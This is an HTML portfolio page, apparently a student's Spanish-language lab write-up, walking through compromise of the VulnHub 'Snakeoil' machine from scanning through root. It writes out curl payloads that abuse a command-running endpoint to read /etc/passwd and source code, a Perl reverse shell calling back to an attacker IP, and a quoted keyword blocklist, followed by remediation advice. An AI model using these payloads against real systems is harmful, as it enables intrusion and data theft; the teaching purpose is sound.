@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Proyecto P1 | CNO IV</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        .terminal-block {
+            background: #0b0f14;
+            padding: 15px;
+            border: 1px solid var(--border-color);
+            border-left: 3px solid var(--accent);
+            color: var(--accent-glow);
+            font-family: monospace;
+            overflow-x: auto;
+            font-size: 0.85rem;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+        .img-placeholder {
+            width: 100%;
+            border: 1px dashed var(--accent);
+            border-radius: 4px;
+            margin: 15px 0;
+            opacity: 0.8;
+            transition: opacity 0.3s;
+        }
+        .img-placeholder:hover {
+            opacity: 1;
+        }
+        .section-title {
+            color: #ffcc00;
+            border-bottom: 1px solid rgba(255, 204, 0, 0.3);
+            padding-bottom: 5px;
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+        p {
+            margin-bottom: 12px;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+    <div class="dashboard">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="brand">
+                <span class="logo-icon pulse"></span>
+                <h2>CNO IV PORTAFOLIO</h2>
+            </div>
+            <nav class="nav-menu">
+                <a href="../index.html"><span class="nav-dot"></span>01. INICIO</a>
+                <a href="index.html" class="active"><span class="nav-dot"></span>02. PARCIAL_1</a>
+                <a href="../parcial2/index.html"><span class="nav-dot"></span>03. PARCIAL_2</a>
+                <a href="../parcial3/index.html"><span class="nav-dot"></span>04. PARCIAL_3</a>
+            </nav>
+            <div class="system-status">
+                <p>STATUS: <span class="text-green blink">SECURE</span></p>
+                <a href="https://t.me/D3im0s" target="_blank" class="telegram-link"></a>
+            </div>
+        </aside>
+
+        <!-- Contenido Principal -->
+        <main class="main-content">
+            <header class="topbar">
+                <a href="index.html" class="back-btn">< VOLVER A ACTIVIDADES</a>
+                <div class="user-info">
+                    <span>OP: sys_d3im0s</span>
+                </div>
+            </header>
+
+            <div class="grid-container">
+                
+                <!-- Encabezado Académico -->
+                <div class="card fade-in span-4">
+                    <div class="card-title" style="color: #ffcc00;">> PROYECTO 1ER PARCIAL: WALKTHROUGH EN ACCIÓN</div>
+                    <div class="card-content" style="display: flex; justify-content: space-between; flex-wrap: wrap; gap: 15px; padding: 15px 20px;">
+                        <div>
+                            <p><strong>Estudiante:</strong> Angel Aaron Acuña Quezada (181583)</p>
+                            <p><strong>Catedrático:</strong> Mtro. Servando López Contreras</p>
+                            <p><strong>Fecha:</strong> 08 de septiembre del 2026</p>
+                        </div>
+                        <div style="text-align: right; border-left: 1px solid var(--border-color); padding-left: 20px;">
+                            <p style="color: #ffcc00; font-weight: bold; font-size: 1.1rem;">ESTADO: ROOT OBTENIDO</p>
+                            <a href="../pdf/ProyectoP1.pdf" download="ProyectoP1.pdf" class="back-btn" style="font-size: 0.85rem; border: 1px solid #ffcc00; padding: 5px 12px; background: rgba(255, 204, 0, 0.05); color: #ffcc00; margin-top: 15px;">
+                                [ ↓ ] DESCARGAR REPORTE TÉCNICO
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ESPACIO PARA VIDEO (Requisito Especial) -->
+                <div class="card fade-in span-4" style="border: 1px solid var(--accent);">
+                    <div class="card-title">> PRUEBA DE CONCEPTO [POC_VIDEO]</div>
+                    <div class="card-content" style="text-align: center; padding: 20px;">
+                        <video width="100%" controls style="max-width: 800px; border: 1px solid var(--border-color); border-radius: 4px; background: #0b0f14;">
+                            <source src="../video/walkthrough.mp4" type="video/mp4">
+                            Tu navegador no soporta la reproducción de video.
+                        </video>
+                    </div>
+                </div>
+
+                <!-- Introducción y Objetivos -->
+                <div class="card fade-in span-4">
+                    <div class="card-title">1. INTRODUCCIÓN Y OBJETIVOS</div>
+                    <div class="card-content">
+                        <p>El presente informe documenta el desarrollo completo de una prueba de penetración realizada sobre la máquina virtual vulnerable "Snakeoil", con base en el sistema operativo Debian 10. El ejercicio se realizó en un entorno de laboratorio completamente aislado, utilizando virtualización mediante Hyper-V, con el propósito de aplicar de manera práctica los conocimientos teóricos adquiridos en la materia de Seguridad informática.</p>
+                        <p>A lo largo de este documento se describe cada una de las fases del proceso, desde la configuración inicial del entorno hasta la obtención de privilegios root en el sistema objetivo, explicando en cada etapa las herramientas utilizadas, los comandos ejecutados, los resultados obtenidos y el razonamiento técnico que sustentó cada decisión tomada durante el ataque.</p>
+                        
+                        <h4 class="section-title">Objetivo general</h4>
+                        <p>Demostrar la capacidad de aplicar conocimientos teóricos de seguridad informática en un entorno práctico, mediante la realización de un walkthrough detallado y la explicación de las técnicas y metodologías utilizadas para vulnerar una máquina virtual.</p>
+                    </div>
+                </div>
+
+                <!-- Entorno de Laboratorio -->
+                <div class="card fade-in span-4">
+                    <div class="card-title">2. DESCRIPCIÓN DEL ENTORNO DE LABORATORIO</div>
+                    <div class="card-content">
+                        <p>Para este proyecto se utilizaron dos máquinas virtuales sobre Hyper-V: una máquina atacante con Parrot OS y la máquina objetivo, Snakeoil (basada en Debian 10), descargada desde VulnHub. Ambas máquinas se configuraron en Default Switch para garantizar que pudieran comunicarse entre sí, sin exponer el entorno de pruebas a la red física ni a Internet.</p>
+                        <img src="../img/snakeoil_hyperv.png" alt="Configuración Hyper-V" class="img-placeholder">
+                    </div>
+                </div>
+
+                <!-- Reconocimiento -->
+                <div class="card fade-in span-4">
+                    <div class="card-title">3. DESARROLLO DEL ATAQUE: RECONOCIMIENTO</div>
+                    <div class="card-content">
+                        <p>El primer paso de todo reconocimiento es entender en qué red se encuentra el atacante, ya que de ahí se deriva el rango que se deberá escanear para ubicar al objetivo. Para esto se utilizó el comando "ip a".</p>
+                        <div class="terminal-block">$ ip a</div>
+                        <img src="../img/snakeoil_ip.png" alt="Comando IP" class="img-placeholder">
+                        <p>Este comando muestra todas las interfaces de red del sistema junto con su dirección IP y máscara de subred. En este caso, la interfaz eth0 mostró una dirección dentro del rango 172.30.48.0/20, (el comando muestra una IP distinta porque esta captura se tomó después de reiniciar la máquina virtual, lo que renueva la dirección asignada) lo que indica una red interna asignada automáticamente por el adaptador virtual de Hyper-V.</p>
+
+                        <h4 class="section-title">Descubrimiento del objetivo</h4>
+                        <p>Conociendo el rango de red, el siguiente paso es identificar qué otros dispositivos están activos en ese segmento. Para ello se utilizó ARP-Scan, una herramienta que envía peticiones ARP a cada dirección del rango indicado y recopila las respuestas, permitiendo listar los hosts activos junto con su dirección MAC:</p>
+                        <div class="terminal-block">$ sudo arp-scan --interface=eth0 172.30.24.101/20</div>
+                        <img src="../img/snakeoil_arpscan.png" alt="Comando Arp-scan" class="img-placeholder">
+                        <p>El resultado mostró dos hosts activos: la puerta de enlace (terminada en .1, típica de la puerta de enlace de Hyper-V) y un segundo host que, por descarte, correspondía a la máquina Snakeoil.</p>
+
+                        <h4 class="section-title">Escaneo de puertos y servicios</h4>
+                        <p>Una vez identificada la IP del objetivo, se procedió a determinar qué puertos estaban abiertos y qué servicios corrían en ellos, ya que esta información define la superficie de ataque disponible. Se utilizó Nmap con el siguiente comando:</p>
+                        <div class="terminal-block">$ nmap -sV -sC -p- -T4 &lt;ip&gt;</div>
+                        <img src="../img/snakeoil_nmap.png" alt="Escaneo Nmap" class="img-placeholder">
+                        <p>El resultado reveló tres puertos abiertos:</p>
+                        <ul class="skill-list" style="margin-bottom: 15px;">
+                            <li>> Puerto 22/tcp - SSH (OpenSSH 7.9p1 sobre Debian).</li>
+                            <li>> Puerto 80/tcp - HTTP (nginx 1.14.2), con el título "Welcome to SNAKEOIL!".</li>
+                            <li>> Puerto 8080/tcp - HTTP (nginx 1.14.2), identificado como un posible proxy abierto ("open-proxy"), con el título "Welcome to Good Tech Inc.'s Snake Oil Project".</li>
+                        </ul>
+                        <p>Dado que SSH normalmente no representa un vector de acceso inicial sin credenciales, y que el puerto 8080 mostraba explícitamente una pista relacionada con un comportamiento de proxy, se priorizó la investigación de ese puerto por encima del 80.</p>
+                    </div>
+                </div>
+
+                <!-- Enumeración -->
+                <div class="card fade-in span-4">
+                    <div class="card-title">4. ENUMERACIÓN</div>
+                    <div class="card-content">
+                        <p>Al visitar 'http://&lt;IP&gt;/' en el puerto 80, se encontró una página estática simple sin mayor funcionalidad. En cambio, al visitar 'http://&lt;IP&gt;:8080/', se encontró un mini-CMS tipo blog llamado "Good Tech Inc." con tres publicaciones: Introduction, House Rules y Useful Links, cada una con un botón "Edit" visible sin necesidad de haber iniciado sesión.</p>
+                        <img src="../img/snakeoil_web.png" alt="Portal 8080" class="img-placeholder">
+                        
+                        <p>Al revisar el contenido de "House Rules", se observó que una etiqueta HTML (&lt;b&gt;not&lt;/b&gt;) se mostraba como texto, lo cual indicaba una posible vulnerabilidad o un indicio de manejo descuidado de la salida HTML por parte del desarrollador.</p>
+                        <p>Al hacer clic en el botón "Edit" de una publicación, se accedió directamente a un formulario de edición en 'http://&lt;IP&gt;:8080/2/edit' sin que el sistema solicitara autenticación. Esto es un caso claro de Broken Access Control: el servidor nunca valida en ningún momento si quien hace la petición tiene permisos para editar o eliminar contenido.</p>
+                        <p>El post "Useful Links" contenía además un enlace a la documentación oficial de la librería flask-jwt-extended, lo cual -aunque no se identificó como relevante en el momento- resultó ser una pista intencional del creador de la máquina sobre la tecnología utilizada en el backend.</p>
+
+                        <h4 class="section-title">Enumeración de directorios</h4>
+                        <p>Para identificar rutas del servidor que no estuvieran enlazadas visiblemente desde la interfaz, se utilizó Gobuster, una herramienta de fuerza bruta de directorios y archivos:</p>
+                        <div class="terminal-block">$ gobuster dir -u http://&lt;IP&gt;:8080/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,json</div>
+                        <img src="../img/snakeoil_gobuster.png" alt="Gobuster Scan" class="img-placeholder">
+                        <p>Este comando realiza peticiones HTTP probando cada palabra de una lista de diccionario como posible ruta del servidor, además de probarlas con distintas extensiones de archivo, reportando el código de estado HTTP de cada una para determinar cuáles existen realmente.</p>
+                        <p>El resultado reveló varias rutas adicionales de gran relevancia:</p>
+                        <ul class="skill-list" style="margin-bottom: 15px;">
+                            <li>> /create - formulario para crear nuevas publicaciones.</li>
+                            <li>> /login (405) - endpoint de autenticación, que rechaza peticiones GET.</li>
+                            <li>> /registration (200) - endpoint de registro de usuarios.</li>
+                            <li>> /run (405) - nombre altamente sospechoso, rechaza peticiones GET.</li>
+                            <li>> /secret (500) - endpoint que produce un error interno del servidor.</li>
+                            <li>> /users (200) - posible endpoint de listado de usuarios.</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Identificación y explotación -->
+                <div class="card fade-in span-4">
+                    <div class="card-title">5. IDENTIFICACIÓN Y EXPLOTACIÓN DE VULNERABILIDADES</div>
+                    <div class="card-content">
+                        <p>Al consultar directamente la ruta encontrada '/users':</p>
+                        <div class="terminal-block">$ curl -s http://&lt;IP&gt;:8080/users</div>
+                        <p>El servidor respondió con un JSON conteniendo el nombre de usuario 'patrick' junto con su contraseña cifrada mediante PBKDF2-SHA256. Esto representa una vulnerabilidad de Exposición de Datos Sensibles, ya que un endpoint de la API entrega información crítica del sistema sin requerir ningún tipo de autenticación ni autorización.</p>
+                        
+                        <h4 class="section-title">Creación de cuenta legítima</h4>
+                        <p>Al probar la ruta /registration con el método POST:</p>
+                        <div class="terminal-block">$ curl -s -X POST http://&lt;IP&gt;:8080/registration \
+-H "Content-Type: application/json" \
+-d '{"username":"usuario","password":"123"}'</div>
+                        <img src="../img/snakeoil_jwt.png" alt="Registro JWT" class="img-placeholder">
+                        <p>El servidor permitió el registro de una cuenta nueva sin ninguna restricción, devolviendo un token JWT (JSON Web Token) de acceso. Esto evidenció que la aplicación gestiona la autenticación mediante JWT, y proporcionó un camino directo para obtener credenciales válidas sin necesidad de crackear el hash filtrado.</p>
+
+                        <h4 class="section-title">Descubrimiento de /run y clave secreta</h4>
+                        <p>Utilizando el token JWT obtenido, se probó el endpoint sospechoso /run mediante POST:</p>
+                        <div class="terminal-block">$ curl -s -X POST http://&lt;IP&gt;:8080/run \
+-H "Authorization: Bearer &lt;TOKEN&gt;" \
+-H "Content-Type: application/json" \
+-d '{}'</div>
+                        <p>El servidor respondió indicando que se debía proporcionar un parámetro url en formato ip:puerto, y posteriormente, al incluirlo, indicó que además se requería un parámetro secret_key. Esto sugería un mecanismo de doble validación: autenticación JWT más una clave secreta adicional para acceder a esta funcionalidad interna.</p>
+
+                        <h4 class="section-title">Obtención de la clave secreta</h4>
+                        <p>Se intentó enviar el JWT de las formas convencionales (encabezado Authorization, parámetro de query string), sin éxito. La librería flask-jwt-extended, mencionada explícitamente en el post "Useful Links" de la aplicación, soporta múltiples ubicaciones para transportar el token: encabezados, cookies, parámetros de query o cuerpo JSON. Siguiendo esa pista, se probó enviar el JWT como "cookie" en lugar de encabezado:</p>
+                        <div class="terminal-block">$ curl -s http://&lt;IP&gt;:8080/secret --cookie "access_token_cookie=&lt;TOKEN&gt;"</div>
+                        <p>Esta petición reveló la clave secreta esperada por el endpoint /run: "commandexecutionissecret". El nombre de la clave por sí mismo confirmaba la sospecha de que el endpoint ejecutaba comandos del sistema.</p>
+
+                        <h4 class="section-title">Ejecución remota de comandos</h4>
+                        <p>Aclaración sobre el uso de curl: en este ataque usamos "curl" de dos formas. Primero, desde nuestra máquina atacante, para enviar las peticiones a /run (como un navegador sin interfaz gráfica). Segundo, el propio servidor de Snakeoil ejecutaba su propio curl internamente con el texto que le mandábamos en el campo url.</p>
+                        <p>Nos dimos cuenta de esto porque, al mandar la primera petición válida, la respuesta no fue un JSON normal, sino literalmente la barra de progreso que curl muestra al descargar algo (% Total, % Received, etc.) - una salida muy característica que solo aparece cuando curl corre en una terminal.</p>
+                        <p>Esa fue la señal de que el servidor estaba ejecutando curl internamente con nuestros datos, sospecha que después se confirmó al leer el código fuente y ver la línea Popen("/usr/bin/curl " + url, shell=True). Ese curl interno, al correr dentro de Snakeoil, sí tenía acceso a sus archivos locales, lo cual nos permitió leer /etc/passwd y el código fuente de la aplicación - algo que ningún curl externo puede hacer por sí solo.</p>
+                        <p>Con la clave secreta obtenida, se envió una petición válida a `/run':</p>
+                        <div class="terminal-block">$ curl -s -X POST http://&lt;IP&gt;:8080/run \
+-H "Authorization: Bearer &lt;TOKEN&gt;" \
+-H "Content-Type: application/json" \
+-d '{"url":"127.0.0.1:80","secret_key":"commandexecutionissecret"}'</div>
+                        <p>La respuesta mostró las estadísticas de progreso típicas del comando "curl", confirmando que el servidor ejecutaba internamente una petición HTTP hacia la dirección indicada. Este comportamiento es característico de Server-Side Request Forgery (SSRF), pues es el atacante quien controla el destino final de la petición saliente del servidor.</p>
+
+                        <h4 class="section-title">Explotación para lectura de archivos locales</h4>
+                        <p>Aprovechando que el backend delega la ejecución a "curl", se utilizó el esquema de URI "file://", soportado nativamente por esta herramienta, para forzar la lectura de archivos del sistema local en lugar de recursos de red:</p>
+                        <div class="terminal-block">$ curl -s -X POST http://&lt;IP&gt;:8080/run \
+-H "Authorization: Bearer &lt;TOKEN&gt;" \
+-H "Content-Type: application/json" \
+-d '{"url":"file:///etc/passwd -o /var/www/html/leaked.txt", "secret_key":"commandexecutionissecret"}'
+
+$ curl -s http://&lt;IP&gt;/leaked.txt</div>
+                        <img src="../img/snakeoil_lfi.png" alt="LFI Execution" class="img-placeholder">
+                        <p>En esta petición, además de la URL con el esquema "file://", se incluyó el parámetro "-o /var/www/html/leaked.txt", correspondiente a la opción de curl para guardar el resultado de la descarga en un archivo específico. Al tratarse de una inyección de parámetros hacia el propio comando curl (y no de una inyección de comandos de shell), fue posible instruir a curl para que escribiera el contenido leído directamente dentro del directorio público, permitiendo así consultarlo posteriormente mediante una petición HTTP normal. El resultado mostró el contenido completo del archivo "/etc/passwd", confirmando lectura y escritura arbitraria de archivos en el sistema a través de esta vulnerabilidad SSRF y con LFI (Local File Inclusion).</p>
+
+                        <h4 class="section-title">Analizando app.py</h4>
+                        <p>Usando el mismo truco, leímos el código fuente de la aplicación (app.py), escrita por Patrick:</p>
+                        <div class="terminal-block">$ curl -s -X POST http://&lt;IP&gt;:8080/run \
+-H "Authorization: Bearer &lt;TOKEN&gt;" \
+-H "Content-Type: application/json" \
+-d '{"url":"file:///proc/self/cwd/app.py -o /var/www/html/app.txt","secret_key":"commandexecutionissecret"}'
+
+$ curl -s http://&lt;IP&gt;/app.txt</div>
+                        <p>Esto nos dejó ver el código hecho en Flask/Python, y confirmó varias cosas importantes:</p>
+                        <ul class="skill-list" style="margin-bottom: 15px;">
+                            <li>> El código arma el comando así: "/usr/bin/curl " + url_del_usuario + " > output.txt", y lo ejecuta con shell=True. O sea, literalmente pega lo que tú mandas junto al comando real - por eso es vulnerable a inyección de comandos.</li>
+                            <li>> Patrick sí intentó protegerse, bloqueando URLs que contuvieran "bash", "python", "/dev/tcp", "nc", "mkfifo" o "php". Pero es un filtro fácil de evadir, basta con usar algo que no esté en esa lista (como Perl, que fue justo lo que usamos después).</li>
+                            <li>> También encontramos la clave secreta de la app (JWT_SECRET_KEY) escrita directo en el código, sin ningún tipo de protección (esta clave nos sería útil más adelante).</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Reverse Shell y Escalación -->
+                <div class="card fade-in span-4">
+                    <div class="card-title">6. REVERSE SHELL Y ESCALACIÓN DE PRIVILEGIOS</div>
+                    <div class="card-content">
+                        <p>Con el conocimiento de que el proceso se ejecuta con "shell=True" y evitando las palabras vetadas por el filtro, se construyó una carga útil en lenguaje Perl para establecer una conexión de shell inversa hacia la máquina atacante:</p>
+                        <p>En la máquina Parrot, se puso en escucha un listener con Netcat en el puerto 4444:</p>
+                        <div class="terminal-block">$ nc -lvnp 4444</div>
+                        <p>Posteriormente, se envió la siguiente petición al endpoint vulnerable:</p>
+                        <div class="terminal-block">$ curl -s -X POST http://&lt;IP&gt;:8080/run \
+-H "Authorization: Bearer &lt;TOKEN&gt;" \
+-H "Content-Type: application/json" \
+-d '{"url":"127.0.0.1:80 -s; perl -e '\''use Socket;$i=\"&lt;IP_ATACANTE&gt;\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\''","secret_key":"commandexecutionissecret"}'</div>
+                        <p>Este payload en Perl crea un socket TCP, establece conexión hacia la IP y puerto especificados de la máquina atacante, y redirige la entrada, salida y error estándar del sistema hacia dicho socket. Como Perl no se encuentra en la lista de palabras vetadas por el filtro del servidor, esta técnica logró evadir la protección implementada.</p>
+                        <img src="../img/snakeoil_shell.png" alt="Reverse Shell" class="img-placeholder">
+                        <p>Al ejecutarse, la conexión llegó exitosamente al listener, obteniendo una shell interactiva como el usuario "Patrick".</p>
+
+                        <h4 class="section-title">Mejora de la shell TTY upgrade</h4>
+                        <p>La shell obtenida inicialmente era limitada, para obtener una terminal completamente funcional, se ejecutó:</p>
+                        <div class="terminal-block">$ python3 -c 'import pty; pty.spawn("/bin/bash")'</div>
+                        <p>Este comando utiliza el módulo "pty" de Python para generar una pseudo-terminal (PTY) completa y ejecutar "/bin/bash" dentro de ella, otorgando una experiencia de terminal normal, necesaria para poder utilizar comandos que requieren un TTY real, como "sudo".</p>
+
+                        <h4 class="section-title">Escalación de privilegios</h4>
+                        <p>Una vez con una shell interactiva completa, se verificó qué comandos podía ejecutar el usuario "Patrick" con privilegios elevados:</p>
+                        <div class="terminal-block">$ sudo -l</div>
+                        <p>El resultado mostró dos reglas relevantes en el archivo sudoers:</p>
+                        <div class="terminal-block">(root) NOPASSWD: /sbin/shutdown<br>(ALL: ALL) ALL</div>
+                        <p>La segunda línea indica que el usuario "Patrick" puede ejecutar cualquier comando como cualquier usuario, incluyendo root, siempre que proporcione su contraseña.</p>
+
+                        <h4 class="section-title">Obtención de la contraseña del sistema</h4>
+                        <p>En este punto revisamos el historial de bash de Patrick (~/.bash_history) para ver qué comandos solía usar, y notamos que revisaba y probaba su propio archivo app.py con bastante frecuencia. Eso nos hizo recordar algo que ya habíamos visto antes al leer ese mismo código: la clave JWT_SECRET_KEY, que estaba puesta directo en el archivo sin ninguna protección. Se nos ocurrió probar esa misma clave como si fuera la contraseña del sistema de Patrick - y funcionó.</p>
+
+                        <h4 class="section-title">Confirmación de acceso root</h4>
+                        <p>Al probar esa clave como contraseña, obtuvimos acceso como root. Después de esto, procedimos a comprobar que el acceso fuera real y completo.</p>
+                        <img src="../img/snakeoil_root.png" alt="Root Shell" class="img-placeholder">
+                    </div>
+                </div>
+
+                <!-- Tabla de Vulnerabilidades y Remediaciones -->
+                <div class="card fade-in span-4">
+                    <div class="card-title">7. TABLA DE VULNERABILIDADES</div>
+                    <div class="card-content">
+                        <table style="width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 0.9rem;">
+                            <thead>
+                                <tr style="border-bottom: 1px solid var(--accent); color: var(--accent);">
+                                    <th style="padding: 10px; text-align: left;">Vulnerabilidad</th>
+                                    <th style="padding: 10px; text-align: left;">Descripción</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr style="border-bottom: 1px dashed var(--border-color);">
+                                    <td style="padding: 10px; font-weight: bold;">Broken Access Control (IDOR)</td>
+                                    <td style="padding: 10px;">Edición y eliminación de contenido sin autenticación.</td>
+                                </tr>
+                                <tr style="border-bottom: 1px dashed var(--border-color);">
+                                    <td style="padding: 10px; font-weight: bold;">Exposición de Datos Sensibles</td>
+                                    <td style="padding: 10px;">"/users" expone nombres de usuario y hashes de contraseña.</td>
+                                </tr>
+                                <tr style="border-bottom: 1px dashed var(--border-color);">
+                                    <td style="padding: 10px; font-weight: bold;">Configuración insegura de JWT</td>
+                                    <td style="padding: 10px;">Se permite manipular el JWT y expone información sensible adicional.</td>
+                                </tr>
+                                <tr style="border-bottom: 1px dashed var(--border-color);">
+                                    <td style="padding: 10px; font-weight: bold;">Exposición de credenciales</td>
+                                    <td style="padding: 10px;">La clave secreta de la aplicación ("JWT_SECRET_KEY") está en texto plano.</td>
+                                </tr>
+                                <tr>
+                                    <td style="padding: 10px; font-weight: bold;">Reutilización de credenciales</td>
+                                    <td style="padding: 10px;">La misma clave secreta de la aplicación se reutilizó como contraseña del sistema operativo del usuario "Patrick".</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        
+                        <h4 class="section-title">Recomendaciones de remediación</h4>
+                        <ul class="skill-list" style="margin-bottom: 15px;">
+                            <li>> Poner verificación de sesión/permisos en TODAS las rutas administrativas (editar, borrar, ver usuarios) - nada de dejarlas abiertas para cualquiera.</li>
+                            <li>> Nunca mostrar hashes de contraseñas en una API pública, aunque estén "cifrados".</li>
+                            <li>> Elegir UN solo lugar para mandar el JWT (de preferencia headers, sobre HTTPS) - no dejar que se pueda mandar por cookie, query string, body, etc. al mismo tiempo, porque eso abre más huecos.</li>
+                            <li>> Quitar por completo endpoints tipo "backdoor" que ejecuten comandos del sistema, aunque sea "solo para desarrollo".</li>
+                            <li>> Nunca armar un comando de shell pegando directamente lo que el usuario escribe; mejor usar listas de argumentos (shell=False) y validar con lista blanca (lo que SÍ se permite), no lista negra (lo que se prohíbe).</li>
+                            <li>> No dejar contraseñas ni claves secretas escritas directo en el código; usar variables de entorno o un gestor de secretos.</li>
+                            <li>> Nunca reutilizar la misma contraseña/clave para varias cosas (una para la app, otra para el sistema, etc.).</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Conclusiones -->
+                <div class="card fade-in span-4">
+                    <div class="card-title">8. CONCLUSIONES</div>
+                    <div class="card-content">
+                        <p>Este proyecto nos permitió llevar a la práctica un montón de conceptos teóricos de seguridad que solo habíamos visto en teoría: desde el reconocimiento inicial hasta lograr control total del sistema. Algo que quedó muy claro es que la seguridad de una aplicación no falla por una sola cosa - en este caso fue la combinación de varios errores (control de acceso mal hecho, configuración insegura del JWT, falta de validación de lo que el usuario mandaba, y reutilizar la misma contraseña para todo) lo que finalmente permitió comprometer la máquina por completo.</p>
+                        <p>También aprendimos que en la vida real explotar una vulnerabilidad casi nunca es un camino derecho y obvio - desde el inicio fue mucho de ir probando, ver qué resultado daba cada cosa, y ajustar la estrategia sobre la marcha. Cada pequeño hallazgo (por más insignificante que pareciera en el momento) terminó siendo pieza clave para avanzar al siguiente paso. Al final, saber interpretar y relacionar lo que cada herramienta iba mostrando con la teoría fue tan importante como saber usar las herramientas en sí.</p>
+                    </div>
+                </div>
+
+            </div>
+            
+            <footer class="soc-footer fade-in" style="margin-top: 20px;">
+                <p> PARCIAL 1 | © 2026 Angel Acuña | CNO IV</p>
+            </footer>
+        </main>
+    </div>
+    <script src="../js/script.js"></script>
+</body>
+</html>
